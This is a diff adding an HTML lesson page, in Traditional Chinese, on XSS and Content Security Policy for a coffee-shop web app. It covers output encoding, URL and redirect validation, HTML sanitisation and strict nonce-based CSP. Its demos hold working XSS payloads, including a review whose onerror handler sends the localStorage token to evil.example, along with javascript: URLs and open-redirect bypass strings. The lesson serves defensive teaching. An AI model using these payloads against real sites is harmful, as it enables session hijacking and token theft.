@@ -1,0 +1,1066 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" href="data:,">
+<title>7. XSS 與 CSP：前端漏洞怎麼變成帳號被盜</title>
+<link rel="stylesheet" href="../../style.css">
+</head>
+<body data-lesson="7">
+<header>
+  <div class="eyebrow">階段 2：瀏覽器裡的登入狀態：Cookie、Session 與跨站攻擊 · 第 7 課</div>
+  <h1>XSS 與 CSP：前端漏洞怎麼變成帳號被盜</h1>
+</header>
+<main>
+
+<p>咖啡店的商品頁可以留評論。某天客服轉來一則看起來很普通的評論：「拿鐵很好喝」，後面接著一段 <code>&lt;img src=x onerror=…&gt;</code>。從那天起，每個打開這個商品頁的顧客，瀏覽器都會執行 <code>onerror</code> 裡的 JavaScript。這段程式跑在 <code>shop.coffee.example</code> 的頁面裡，瀏覽器把它當成咖啡店自己的程式：它能讀頁面、讀 localStorage、用顧客的 cookie 呼叫 API。第 4 課做好的 cookie 設定、第 6 課的 CSRF token，在這裡全部擋不住。</p>
+<p>這類漏洞叫 XSS。這一課的任務是處理這則評論：先弄清楚它為什麼能執行、執行後能拿走什麼，再把咖啡店改到它沒辦法得手。修法有兩層：第一層是在輸出資料的地方做對，讓評論永遠只被當成文字；第二層是 CSP，就算哪一處漏了，瀏覽器也拒絕執行塞進來的程式。</p>
+
+<div class="callout"><strong>這課的路線：</strong>
+<ol>
+  <li>一則評論為什麼能在別人的瀏覽器裡執行程式？它執行之後能拿走什麼，為什麼 HttpOnly 和 CSRF token 都擋不住？</li>
+  <li>評論要怎麼輸出，才只會被當成文字？依輸出位置編碼，Vue 的 <code>{{ }}</code> 幫你做了什麼、沒做什麼。</li>
+  <li>HTML 編碼擋不住的網址要怎麼檢查？同一套做法也用在登入後的 <code>next</code> 導回。</li>
+  <li>店長的公告就是要有粗體和連結時，怎麼顯示才安全？</li>
+  <li>就算哪裡漏了，怎麼讓瀏覽器拒絕執行？CSP 與 Trusted Types，以及咖啡店的 Vite SPA 怎麼上線。</li>
+</ol></div>
+
+<div class="callout"><strong>這課會用到：</strong>
+<ul>
+  <li><a href="04-cookies-sessions.html">第 4 課</a>的 HttpOnly cookie：JavaScript 讀不到，但瀏覽器發請求時照樣會帶上。</li>
+  <li><a href="05-same-origin-cors.html">第 5 課</a>的來源（origin）：協定＋主機＋port。同源的程式可以讀回應，這課的攻擊就是讓惡意程式變成「同源」。</li>
+  <li><a href="02-crypto-toolbox.html">第 2 課</a>的安全亂數：<code>crypto.getRandomValues</code> 產生攻擊者猜不到的位元組，再編成 base64。CSP 的 nonce 要用它產生。</li>
+</ul></div>
+
+<h2>一則評論，為什麼能在別人的瀏覽器裡執行程式？</h2>
+<p>先重現事故。商品頁的後端從資料庫拿出評論，用字串拼接組成 HTML 交給瀏覽器。下面的 <code>renderNaive</code> 就是這段程式：它把評論用字串拼接組成 HTML，第二則評論是攻擊者留的。Worker 裡沒有 DOM，所以只印出產生的 HTML。執行後看第二行：</p>
+<div class="lab"><script type="code">
+// 資料庫裡的評論：第二則是攻擊者留的
+const reviews = [
+  { author: '王小明', text: '拿鐵很好喝' },
+  { author: '路人', text: '推<img src=x onerror="fetch(\'https://evil.example/c?d=\'+localStorage.token)">' },
+]
+
+// 天真的寫法：直接把資料拼進 HTML
+function renderNaive(r: { author: string; text: string }): string {
+  return `<li>${r.author}：${r.text}</li>`
+}
+
+for (const r of reviews) console.log(renderNaive(r))
+// 瀏覽器解析第二行時，看到的是一個真的 <img> 標籤：圖片載入失敗 → 執行 onerror
+</script></div>
+<p>第二行裡有一個完整的 <code>&lt;img&gt;</code> 標籤。對程式來說，評論只是一段字串；但這段字串被拼進 HTML 之後，瀏覽器解析時看到的就是標籤。瀏覽器去載入 <code>src=x</code>，載入失敗，於是執行 <code>onerror</code> 屬性裡的程式，把 localStorage 裡的 token 送到 <code>evil.example</code>。攻擊者不需要入侵伺服器，只需要留一則評論。</p>
+<p>問題的根源是：程式把<strong>資料</strong>（使用者輸入的文字）直接拼進<strong>程式碼</strong>（HTML、JavaScript、網址）。資料裡的 <code>&lt;</code>、<code>"</code> 這類字元在 HTML 裡有特殊意義，拼進去之後，它們就不再是文字，而是變成程式結構的一部分。瀏覽器拿到的是一整份 HTML，沒有任何標記告訴它「從這裡到這裡是使用者寫的」，所以它分不出哪段是咖啡店寫的、哪段是攻擊者塞的。</p>
+<p>這類漏洞叫 <strong>XSS</strong>，全名 cross-site scripting，中文是跨站腳本：讓攻擊者的 JavaScript 在你網站的頁面裡執行。名字裡的「跨站」是歷史因素，不用從字面理解。重點在結果：瀏覽器判斷一段程式有什麼權限，只看它在哪個來源的頁面裡執行。<a href="05-same-origin-cors.html">第 5 課</a>的同源政策保護的是「別的網站讀不到你的資料」；惡意程式在 <code>shop.coffee.example</code> 的頁面裡執行，它就是 <code>shop.coffee.example</code> 自己，擁有這個來源的一切權限，同源政策對它完全不設防。</p>
+
+<figure>
+  <svg viewBox="0 0 700 250" role="img" aria-label="儲存型 XSS：攻擊者留評論存進資料庫，顧客打開商品頁時，惡意程式在咖啡店的頁面裡執行，帶著顧客的 cookie 呼叫 API，或把 token 送到攻擊者的伺服器">
+    <defs><marker id="a7" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="var(--muted)"/></marker></defs>
+    <rect class="d-soft" x="10" y="20" width="140" height="60" rx="8"/>
+    <text class="d-text" x="80" y="46" text-anchor="middle">攻擊者</text>
+    <text class="d-small" x="80" y="66" text-anchor="middle">留一則評論</text>
+    <rect class="d-box" x="210" y="20" width="160" height="60" rx="8"/>
+    <text class="d-text" x="290" y="46" text-anchor="middle">咖啡店 API</text>
+    <text class="d-small" x="290" y="66" text-anchor="middle">原樣存進資料庫</text>
+    <rect class="d-box" x="430" y="20" width="120" height="60" rx="8"/>
+    <text class="d-text" x="490" y="55" text-anchor="middle">資料庫</text>
+    <line class="d-line" x1="150" y1="50" x2="208" y2="50" marker-end="url(#a7)"/>
+    <line class="d-line" x1="370" y1="50" x2="428" y2="50" marker-end="url(#a7)"/>
+    <rect class="d-soft" x="160" y="140" width="290" height="90" rx="8"/>
+    <text class="d-text" x="305" y="166" text-anchor="middle">王小明的瀏覽器</text>
+    <text class="d-small" x="305" y="188" text-anchor="middle">shop.coffee.example 的商品頁</text>
+    <text class="d-accent" x="305" y="212" text-anchor="middle">惡意程式以咖啡店的身分執行</text>
+    <line class="d-line" x1="490" y1="80" x2="420" y2="138" marker-end="url(#a7)"/>
+    <text class="d-small" x="520" y="115">打開商品頁，評論拼進 HTML</text>
+    <line class="d-line" x1="160" y1="185" x2="70" y2="185" marker-end="url(#a7)"/>
+    <text class="d-small" x="20" y="210">送出 token</text>
+    <text class="d-small" x="20" y="226">到 evil.example</text>
+    <line class="d-line" x1="450" y1="185" x2="540" y2="185" marker-end="url(#a7)"/>
+    <text class="d-small" x="550" y="180">帶 cookie 呼叫</text>
+    <text class="d-small" x="550" y="196">/api/me、改密碼…</text>
+  </svg>
+  <figcaption>儲存型 XSS：攻擊者只要留一次評論，之後每個打開頁面的人都會執行它的程式。</figcaption>
+</figure>
+
+<p>評論區只是其中一條路。資料從哪裡進來，決定了要去哪裡找漏洞、誰會中招，所以 XSS 依惡意內容的來源分成三種：</p>
+<div class="table-wrap">
+<table>
+  <tr><th>類型</th><th>惡意內容在哪裡</th><th>咖啡店的例子</th><th>誰會中招</th></tr>
+  <tr><td><strong>儲存型</strong>（stored）</td><td>存進資料庫，之後每次顯示都帶出來</td><td>商品評論存了 <code>&lt;img src=x onerror=…&gt;</code>，商品頁直接把評論拼進 HTML</td><td>每個看到這則評論的人，包括後台審評論的店長</td></tr>
+  <tr><td><strong>反射型</strong>（reflected）</td><td>在網址裡，伺服器把它原樣放進回應</td><td>搜尋頁 <code>/search?q=…</code> 回應「找不到 <em>q 的內容</em>」，攻擊者把惡意的 <code>q</code> 做成連結傳給顧客</td><td>點了那個連結的人</td></tr>
+  <tr><td><strong>DOM 型</strong>（DOM-based）</td><td>前端程式自己把不可信的資料塞進危險 API，伺服器可能完全沒經手</td><td>前端讀 <code>location.hash</code>，用 <code>innerHTML</code> 顯示「目前分類：…」</td><td>點了那個連結的人</td></tr>
+</table>
+</div>
+<p>咖啡店這次是儲存型，也是最危險的一種：攻擊者只要留一次，每個看到的人都中招，不需要騙任何人點連結。</p>
+<p>三種的共同點是：最後都有一段程式，把不可信的字串交給「會把字串當成 HTML 或程式碼解讀」的 API。這類 API 叫<strong>危險注入點</strong>，英文是 sink，意思是資料最後流進去的地方。找 XSS 的方法，就是找出這些注入點，再往回追「這個值是誰給的」。常見的有：<code>innerHTML</code>、<code>outerHTML</code>、<code>insertAdjacentHTML</code>、<code>document.write</code>、<code>eval</code>、<code>new Function</code>、<code>setTimeout('字串')</code>、<code>location.href = …</code>、<code>&lt;a href&gt;</code>。</p>
+<p>寫 Vue 時很少直接碰這些 API，但它們會換個樣子出現。在 Vue 專案裡最常見的入口是：</p>
+<ul>
+  <li><code>v-html</code> 綁使用者的內容（評論、自我介紹、後台編輯的公告）。</li>
+  <li><code>:href</code>、<code>:src</code> 綁使用者給的網址（個人網站、商品連結）：<code>javascript:</code> 網址點下去就會執行。</li>
+  <li>在元件裡直接操作 DOM：<code>el.innerHTML = …</code>。</li>
+  <li>第三方腳本：分析工具、客服聊天、廣告。它們跟你的程式同源執行，供應商被入侵，你的網站就被入侵。</li>
+</ul>
+
+<div class="callout practice"><strong>💡 實務上：接手 Vue 專案，先搜一遍危險注入點</strong><br>接手一個前端專案，最快的 XSS 健檢是在整個專案搜 <code>v-html</code>、<code>innerHTML</code>、<code>insertAdjacentHTML</code>、<code>:href</code>，逐一問「這個值最早是誰輸入的？」。來自店長後台的公告也要算進去：後台帳號被盜或內部人員誤貼，一樣會打到所有顧客。Code review 時看到新增的 <code>v-html</code>，資深的人會要求在 PR 裡寫清楚內容來源和清理方式，也可以把 ESLint 的 <code>vue/no-v-html</code> 規則設成 error，讓它預設報錯，真的需要時再個別關掉。第三方腳本也要列清單：行銷想加一段追蹤碼，要先問誰在維護、能不能拿掉。</div>
+
+<p>知道評論為什麼能執行之後，下一個問題是嚴重程度：咖啡店在第 4 課已經把 session 放進 HttpOnly cookie、第 6 課加了 CSRF token，這段程式到底還能拿走什麼？</p>
+
+<h2>程式跑起來之後能拿走什麼？HttpOnly 和 CSRF token 為什麼擋不住？</h2>
+<p>上一節說過，惡意程式在咖啡店的頁面裡執行，就跟咖啡店自己的前端程式完全同等：前端能做的事，它都能做。所以「登入狀態放在哪裡」只決定損害長什麼樣子，決定不了有沒有損害。三種情況分開看：</p>
+<div class="table-wrap">
+<table>
+  <tr><th>登入狀態放在</th><th>XSS 能做什麼</th><th>關掉分頁之後</th></tr>
+  <tr><td>localStorage 裡的 access token</td><td><code>localStorage.getItem('token')</code> 一行讀走，送到自己的伺服器</td><td>攻擊者在自己的電腦上繼續用，直到 token 過期或被撤銷</td></tr>
+  <tr><td>HttpOnly cookie 裡的 session ID</td><td>讀不到 cookie，但可以 <code>fetch('/api/me/email', { method: 'PATCH', credentials: 'include', … })</code>：瀏覽器自動帶 cookie，這是同源請求，CORS 和 CSRF 防護都不擋，回應也讀得到</td><td>攻擊停止，但已經做的事（改 email、下單、讀個資）都做了</td></tr>
+  <tr><td>不論放哪裡</td><td>在頁面上畫一個假的「登入逾時，請重新輸入密碼」對話框，騙走密碼；讀頁面上的 CSRF token 再發請求</td><td>拿到密碼就是永久的</td></tr>
+</table>
+</div>
+<p>第二列最容易被誤會。HttpOnly 讓 JavaScript 讀不到 cookie，所以攻擊者沒辦法把 session ID 帶回自己的電腦用。但它不需要帶走：瀏覽器發同源請求時本來就會自動附上 cookie，惡意程式只要在受害者的瀏覽器裡直接呼叫 API，伺服器看到的就是一個帶著正確 cookie 的正常請求。這種不偷憑證、直接借用受害者瀏覽器替攻擊者發請求的做法，叫 <strong>session riding</strong>。</p>
+<p>所以 HttpOnly 的作用是<strong>降低損害</strong>：token 不會被帶走、在受害者關掉分頁後繼續被使用。它不是<strong>防 XSS</strong>。<a href="06-csrf.html">第 6 課</a>的 CSRF token 也一樣擋不住：CSRF 防護的前提是攻擊者的程式跑在別的網站，拿不到頁面上的 token；現在惡意程式就跑在咖啡店的頁面上，直接讀得到 token，發出的請求也是同源，<code>Sec-Fetch-Site</code> 是 <code>same-origin</code>。</p>
+<p>既然 XSS 得手後能以使用者身分做任何事，最怕的是它把一次性的攻擊變成永久接管：例如先改 email，再用「忘記密碼」把重設信寄到攻擊者的信箱。所以敏感操作（改 email、改密碼、綁新的 passkey）要再確認一次身分，重新輸入密碼或做多因素認證（MFA，<a href="14-mfa-totp.html">第 14 課</a>、<a href="16-account-flows.html">第 16 課</a>）。這是<strong>縱深防禦</strong>：不依賴單一防線，XSS 得手了，攻擊者還差一步。</p>
+<p>結論很直接：損害擋不住，只能讓惡意程式根本不要執行。這課的答案分兩層：第一層是輸出資料時依位置編碼，讓評論永遠只被當成文字；第二層是 CSP，萬一某處漏了，瀏覽器也拒絕執行。先回到 <code>renderNaive</code>，把第一層做對。</p>
+
+<h2>評論要怎麼輸出，才只會被當成文字？</h2>
+<p><code>renderNaive</code> 的問題是評論裡的 <code>&lt;</code> 被瀏覽器當成標籤的開頭。修法不是把 <code>&lt;</code> 刪掉，而是換一種寫法，讓瀏覽器知道「這裡是一個小於符號的字，不是標籤」。HTML 本來就有這種寫法，叫<strong>字元實體</strong>：<code>&amp;lt;</code> 在畫面上顯示成 <code>&lt;</code>，但解析時不會開始一個標籤。把資料裡有特殊意義的字元，全部換成只代表字元本身的寫法，這個動作叫<strong>輸出編碼</strong>（output encoding），也常叫跳脫（escaping）。評論經過編碼後，顧客在畫面上看到的文字一模一樣，只是瀏覽器不會再把它當成程式。</p>
+<p>下面的 <code>escapeHtml</code> 換掉五個字元。執行後看兩件事：前三個 payload 變成無害的文字，第四個 <code>javascript:alert(1)</code> 原封不動。範例最後一段是另一個位置的問題，等一下會解釋：</p>
+<div class="lab"><script type="code">
+function escapeHtml(s: string): string {
+  return s
+    .replace(/&/g, '&amp;')   // 一定最先換，不然後面產生的 &lt; 會被再換一次
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
+const payloads = [
+  '<script>alert(1)<\/script>',
+  '" onmouseover="alert(1)',
+  '拿鐵 & 可頌',
+  'javascript:alert(1)',
+]
+for (const p of payloads) console.log(escapeHtml(p))
+// 最後一個原封不動：HTML 編碼擋不住 javascript: 網址，網址要另外驗證
+
+// 資料要放進 <script> 時，JSON.stringify 不夠：字串裡的 script 結束標籤會讓 HTML 解析器提早結束 <script>
+const data = { note: '<\/script><img src=x onerror=alert(1)>' }
+console.log(JSON.stringify(data))
+console.log(JSON.stringify(data).replace(/</g, '\\u003c'))  // 在 JSON 裡 < 就是 <，JSON.parse 讀回來一樣
+</script></div>
+<p><code>&amp;</code> 一定要最先換，原因是其他四個字元換出來的結果都以 <code>&amp;</code> 開頭。如果先把 <code>&lt;</code> 換成 <code>&amp;lt;</code>，最後才換 <code>&amp;</code>，剛產生的 <code>&amp;lt;</code> 會再被換成 <code>&amp;amp;lt;</code>，畫面上就顯示成「&amp;lt;」四個字。</p>
+<p>第四個 payload 沒被改，是因為它根本沒有特殊字元。這指出編碼的關鍵：<strong>要依輸出的位置選編碼方式</strong>。同一段資料，放在 HTML 內容、屬性、網址、JavaScript 裡，瀏覽器用不同的規則解析，危險的字元也不同。<code>&lt;</code> 在元素內容裡危險；在屬性值裡，真正能跳出去的是引號；在 <code>href</code> 裡，連一般字母組成的 <code>javascript:</code> 都會執行。</p>
+<div class="table-wrap">
+<table>
+  <tr><th>輸出位置</th><th>例子</th><th>怎麼做</th></tr>
+  <tr><td>HTML 元素內容</td><td><code>&lt;li&gt;資料&lt;/li&gt;</code></td><td>編碼 <code>&amp; &lt; &gt;</code>，<code>&amp;</code> 要最先換</td></tr>
+  <tr><td>HTML 屬性值</td><td><code>&lt;li data-author="資料"&gt;</code></td><td>屬性一定加引號，再編碼 <code>&amp; &lt; &gt; " '</code>。沒加引號時空白就能結束屬性，編碼引號也沒用</td></tr>
+  <tr><td>網址屬性</td><td><code>&lt;a href="資料"&gt;</code></td><td>HTML 編碼不夠：<code>javascript:alert(1)</code> 沒有任何特殊字元。要解析網址，只允許 <code>http:</code>、<code>https:</code></td></tr>
+  <tr><td><code>&lt;script&gt;</code> 裡</td><td><code>const user = 資料</code></td><td>不要拼。改放進 <code>&lt;script type="application/json"&gt;</code> 或 <code>data-*</code> 屬性，再用 <code>JSON.parse</code> 讀</td></tr>
+  <tr><td>事件屬性、<code>style</code></td><td><code>onclick="…資料…"</code></td><td>不要放使用者資料</td></tr>
+</table>
+</div>
+<p>範例最後一段對應表格的 <code>&lt;script&gt;</code> 那一列。後端有時想把資料直接放進頁面的 <code>&lt;script&gt;</code> 裡給前端讀，以為 <code>JSON.stringify</code> 就安全。但 HTML 解析器在 JavaScript 執行之前就先掃過整份文件，只要看到 script 的結束標籤就結束這個 <code>&lt;script&gt;</code>，不管它是不是在 JSON 字串裡。所以要把 <code>&lt;</code> 換成 <code>\u003c</code>（JSON 字串裡 <code>&lt;</code> 的 Unicode 跳脫寫法）：對 JSON 來說兩者是同一個字元，<code>JSON.parse</code> 讀回來一樣，但 HTML 解析器看不到結束標籤。</p>
+<p>你可能會想：為什麼不在評論<strong>存進資料庫時</strong>就把 <code>&lt; &gt;</code> 過濾掉，一勞永逸？因為存進去的時候，還不知道之後會輸出到哪裡：</p>
+<ul>
+  <li>同一則評論會出現在網頁、App、email、後台、匯出的 CSV，每個位置的危險字元不同。濾掉 <code>&lt; &gt;</code> 擋不住屬性裡的引號，也擋不住 <code>javascript:</code> 網址。</li>
+  <li>會毀掉正常資料：「買 2 杯 &lt; 3 杯的價格」被改壞。</li>
+  <li>輸入驗證（長度、格式、允許的值）仍然要做，它是另一件事：擋掉不合理的資料。防 XSS 的責任在<strong>輸出</strong>的地方。</li>
+</ul>
+<p>寫 Vue 的好消息是：大部分的編碼 Vue 已經替你做了。模板裡的 <code>{{ }}</code> 用瀏覽器的 <code>textContent</code> 寫入，內容一律當文字；<code>:title</code> 這類屬性綁定用 <code>setAttribute</code>，值跳不出屬性。所以咖啡店的前台只要用 <code>{{ review.text }}</code> 顯示評論，那則 <code>&lt;img onerror&gt;</code> 就只會顯示成一串文字。Vue 不會處理的有兩處：<code>v-html</code> 直接設 <code>innerHTML</code>，完全不跳脫；<code>:href</code> 會跳脫引號，但跳脫擋不住 <code>javascript:</code>。Vue 的安全指南建議使用者提供的網址在<strong>後端</strong>存進資料庫前就清理，這樣網頁、App 每個用戶端都受保護。</p>
+<p>Vue 的自動跳脫只保護 Vue 輸出的地方，後端還有兩類輸出它管不到：</p>
+<ul>
+  <li><strong>API 回應本身</strong>：回應 JSON 時，<code>Content-Type</code> 要是 <code>application/json</code>，並加上 <code>X-Content-Type-Options: nosniff</code>。如果標成 <code>text/html</code>，有人直接在瀏覽器打開 <code>/api/reviews/7</code>，瀏覽器會把 JSON 裡的 <code>&lt;img onerror&gt;</code> 當 HTML 執行。<code>nosniff</code> 叫瀏覽器照標頭寫的類型處理，不要自己猜內容是什麼。</li>
+  <li><strong>後端產生的 HTML</strong>：訂單確認信、匯出的 PDF、伺服器渲染的後台頁面。模板引擎要開自動跳脫，自己拼字串時用上面的編碼。後台特別危險：店長權限比顧客大，儲存型 XSS 打到後台，攻擊者拿到的是店長的權限。</li>
+</ul>
+<p>評論的文字到這裡處理完了。但表格裡有一列 HTML 編碼擋不住：網址。咖啡店的評論旁邊會顯示作者在個人頁填的網站，那個連結要怎麼檢查？</p>
+
+<h2>使用者給的網址，要怎麼檢查？</h2>
+<p>作者的網站要顯示成 <code>&lt;a :href="author.website"&gt;</code>。如果作者填的是 <code>javascript:fetch(…)</code>，顧客一點就執行。直覺的做法是檢查字串開頭是不是 <code>javascript:</code>，但這擋不住。瀏覽器解析網址時，協定不分大小寫、會去掉開頭結尾的空白與控制字元、刪掉中間的 tab 和換行，所以 <code>JaVaScRiPt:</code>、開頭多一個空白的 <code>javascript:</code>、<code>java[tab]script:</code> 全都會執行。你的字串規則跟瀏覽器的解析規則只要差一點，就是一個繞過的方法。</p>
+<p>正確做法是讓瀏覽器自己的規則來判斷：用 <code>new URL()</code> 解析，它跟瀏覽器點連結時用的是同一套網址規範，解析後的 <code>protocol</code> 就是瀏覽器真正會用的協定。再用<strong>允許清單</strong>檢查，只放行 <code>http:</code>、<code>https:</code>。不要用黑名單：黑名單只擋 <code>javascript:</code>，<code>data:text/html,…</code> 就漏了，而你永遠列不完所有危險的協定。執行後看每一行的 <code>protocol</code>，前四個怎麼寫都會被正規化成 <code>javascript:</code> 或 <code>data:</code>：</p>
+<div class="lab"><script type="code">
+const inputs = [
+  'JaVaScRiPt:alert(1)',
+  '  javascript:alert(1)',
+  'java\tscript:alert(1)',
+  'data:text/html,<script>alert(1)<\/script>',
+  'HTTPS://Coffee.Example/menu',
+  'https://咖啡.tw/菜單',
+]
+for (const s of inputs) {
+  const url = new URL(s)
+  console.log(JSON.stringify(s), '→ protocol', url.protocol, '| href', url.href)
+}
+</script></div>
+
+<h3>同一個問題：登入後的 next 參數</h3>
+<p>咖啡店還有一個地方在用使用者給的網址，而且更容易被忽略：登入頁。顧客在訂單頁被要求登入時，網址會是 <code>/login?next=/orders/42</code>，登入完導回原本的頁面。<code>next</code> 是網址的一部分，任何人都能改。如果它可以是任意網址，這就是<strong>開放重導向</strong>（open redirect）：攻擊者寄出 <code>https://shop.coffee.example/login?next=https://evil.example/fake-login</code>，連結的網域是真的，顧客放心登入，登入後卻被帶到假網站，上面寫著「密碼錯誤，請再輸入一次」。在 OAuth 裡，開放重導向還能把授權碼帶走（<a href="12-oauth-pkce.html">第 12 課</a>）。</p>
+<p>這裡的規則跟作者網站不同：作者網站可以連到任何網站，只是協定要對；<code>next</code> 只能留在咖啡店自己的網站裡。常見的寫法是檢查 <code>next.startsWith('/')</code>，但它跟上面的字串檢查有同樣的問題：</p>
+<ul>
+  <li><code>//evil.example</code>：開頭是 <code>/</code>，但兩個斜線開頭是「沿用目前協定的完整網址」，會跳到 evil.example。</li>
+  <li><code>/\evil.example</code>：對 http、https 網址，瀏覽器把 <code>\</code> 當成 <code>/</code>，結果同上。</li>
+  <li><code>startsWith('https://shop.coffee.example')</code> 也不行：<code>https://shop.coffee.example.evil.example</code> 是攻擊者的網域。</li>
+</ul>
+<p>做法一樣是交給 URL 解析器：用 <code>new URL(next, 自己的來源)</code> 解析，第二個參數是相對路徑的基準，<code>/orders/42</code> 會接在自己的來源後面。再比對解析後的 <code>origin</code> 跟自己的來源完全相等，只回傳路徑部分。還有一個細節：<code>/.//evil.example</code> 解析後還在自己的來源，但 <code>pathname</code> 是 <code>//evil.example</code>，原樣交給 <code>Location</code> 標頭又變成跳到別的網站，所以結果以 <code>//</code> 開頭時也要拒絕。執行後看每一行的 origin 是不是 <code>https://shop.coffee.example</code>，以及最後一行的路徑：</p>
+<div class="lab"><script type="code">
+const app = 'https://shop.coffee.example'
+for (const next of ['/orders/42?tab=items#top', '//evil.example', '/\\evil.example', 'https://shop.coffee.example.evil.example', '/.//evil.example']) {
+  const url = new URL(next, app)
+  console.log(JSON.stringify(next), '→ origin', url.origin, '| 路徑', url.pathname + url.search + url.hash)
+}
+</script></div>
+<p>到這裡，評論的文字和作者的網址都能安全輸出。但咖啡店有一種內容不能跳脫：店長在後台寫的公告，本來就要有粗體和連結。</p>
+
+<h2>店長的公告就是要排版，怎麼顯示才安全？</h2>
+<p>前台用 <code>{{ }}</code> 顯示公告，<code>&lt;b&gt;</code> 會被跳脫成文字，畫面上出現一堆 <code>&amp;lt;b&amp;gt;</code>。要顯示格式，就得用 <code>v-html</code> 把 HTML 交給瀏覽器，這正是上一節說的危險注入點。這時候要做的不是編碼，而是<strong>清理</strong>（sanitize）：把 HTML 解析成一棵樹，只留下允許的標籤與屬性，其他全部移除，再把結果交給 <code>v-html</code>。</p>
+<p>清理的難處在於「解析」要跟瀏覽器完全一致。瀏覽器的 HTML 解析器非常寬容：大小寫混寫、屬性中間換行、HTML 實體、SVG 和 MathML 裡的標籤，都會被解析成可執行的東西。所以：</p>
+<ul>
+  <li><strong>用成熟的函式庫</strong>，例如 <a href="https://github.com/cure53/DOMPurify">DOMPurify</a>（瀏覽器直接用；Node 要搭配 jsdom）。它用瀏覽器自己的解析器解析，處理了 SVG、MathML、各種解析怪癖。</li>
+  <li><strong>用允許清單</strong>：<code>DOMPurify.sanitize(dirty, { ALLOWED_TAGS: ['b', 'i', 'a', 'p'], ALLOWED_ATTR: ['href'] })</code>，只放需要的。黑名單（「去掉 script 和 on 開頭的屬性」）永遠列不完。</li>
+  <li><strong>不要自己寫正規表示式清理 HTML</strong>：<code>&lt;scr&lt;script&gt;ipt&gt;</code> 去掉一次中間的 <code>&lt;script&gt;</code> 後剛好拼出新的 <code>&lt;script&gt;</code>；<code>&lt;svg&gt;&lt;animate onbegin=…&gt;</code>、大小寫、換行、HTML 實體的變化，正規表示式都追不上瀏覽器的解析規則。</li>
+</ul>
+<p>如果需求允許，也可以不讓使用者寫 HTML，改寫 Markdown。但後端把 Markdown 轉成 HTML 之後一樣要清理，因為 Markdown 允許內嵌 HTML，也允許 <code>[點我](javascript:…)</code> 這種連結。反過來，如果真的要讓使用者寫任意 HTML、CSS，例如店家自訂的活動頁，清理就不適用了，要把它放在 <code>&lt;iframe sandbox&gt;</code> 裡，最好用另一個網域，讓它跟主站不同源，裡面的程式碼就算執行也碰不到主站。Vue 的安全指南也說，使用者提供的 HTML 除非在沙箱 iframe 裡，否則不能視為安全。</p>
+<p>清理要在<strong>每次輸出前</strong>做，或在存入時做並記住「這欄是清理過的 HTML」。前者比較保險：DOMPurify 會修正新發現的繞過手法，輸出前清理的話，升級套件就等於重新清理了所有舊資料。</p>
+
+<div class="callout practice"><strong>💡 實務上：PM 說「讓店長自己排版公告」時</strong><br>這類需求通常會變成在後台裝一個富文字編輯器（rich text editor）。編輯器只管「輸入」，存進資料庫的 HTML 一樣可能被人直接打 API 塞進惡意內容，所以顯示端還是要用 DOMPurify 清理，不能因為「編輯器只做得出粗體」就信任它。先跟 PM 確認真正需要的格式：多數公告只要粗體、清單、連結，允許清單越短越好；要嵌 YouTube、自訂樣式的需求，就要另外談 iframe 沙箱。DOMPurify 這類套件要跟著安全性更新升級，交給 Dependabot 或 Renovate 這類工具自動開升級 PR，不要鎖在多年前的版本。</div>
+
+<p>現在咖啡店的每一種輸出都有正確做法了。但這些做法的前提是：每一個輸出點、每一位同事、每一次改版都做對。大專案總有一處漏掉，例如某個新頁面用了 <code>v-html</code> 卻沒清理。能不能有一道網，在漏掉的時候也接住？</p>
+
+<h2>就算哪裡漏了，能不能叫瀏覽器拒絕執行？CSP</h2>
+<p>這道網叫 <strong>CSP</strong>（Content Security Policy，內容安全政策）。它是伺服器在回應標頭裡寫給瀏覽器的一份規則：「這個頁面只能執行這些腳本」。瀏覽器照著規則執行，不在規則裡的一律拒絕。回到那則評論：就算某個頁面漏了編碼，<code>&lt;img onerror&gt;</code> 真的進了 HTML，在嚴格的 CSP 下，瀏覽器也不會執行 <code>onerror</code> 裡的程式。CSP 是縱深防禦，不取代輸出編碼：它擋的是執行，HTML 還是被注入了，而且政策寫錯就形同虛設。</p>
+<p>問題是瀏覽器怎麼分辨「咖啡店自己的腳本」和「攻擊者塞進來的腳本」？web.dev 建議的<strong>嚴格 CSP</strong>（strict CSP）用的方法是 nonce。<strong>nonce</strong> 是 number used once 的縮寫：伺服器每次回應都產生一個新的隨機值，同時寫在 CSP 標頭和這份 HTML 的每個 <code>&lt;script nonce="…"&gt;</code> 上。瀏覽器只執行 nonce 跟標頭相符的腳本。咖啡店自己的腳本是伺服器在同一個回應裡產生的，帶著正確的值；攻擊者的評論是幾天前存進資料庫的，不可能知道這一次的值。完整的政策長這樣：</p>
+<pre>Content-Security-Policy: script-src 'nonce-R4nd0mV4lu3xxxxxxxxxx==' 'strict-dynamic'; object-src 'none'; base-uri 'none'</pre>
+<p>每個指令各補一個洞：</p>
+<div class="table-wrap">
+<table>
+  <tr><th>指令</th><th>作用</th></tr>
+  <tr><td><code>script-src 'nonce-…'</code></td><td>只有帶著這次 nonce 的 script 標籤能執行。攻擊者注入的 <code>&lt;script&gt;</code> 不知道這次的值；<code>onerror</code> 這類事件屬性、<code>javascript:</code> 網址一律不執行</td></tr>
+  <tr><td><code>'strict-dynamic'</code></td><td>被 nonce 信任的腳本，用 <code>document.createElement('script')</code> 動態載入的腳本也被信任。打包工具會動態載入分割出來的程式碼，有了它就不必列網域清單</td></tr>
+  <tr><td><code>object-src 'none'</code></td><td>禁止 <code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code> 這類外掛內容，它們能繞過 script 的限制</td></tr>
+  <tr><td><code>base-uri 'none'</code></td><td>禁止 <code>&lt;base href&gt;</code>。攻擊者能注入 <code>&lt;base href="https://evil.example/"&gt;</code> 時，頁面上用相對路徑載入的 <code>&lt;script src="/app.js"&gt;</code> 就會從 evil.example 載入，nonce 照樣有效</td></tr>
+</table>
+</div>
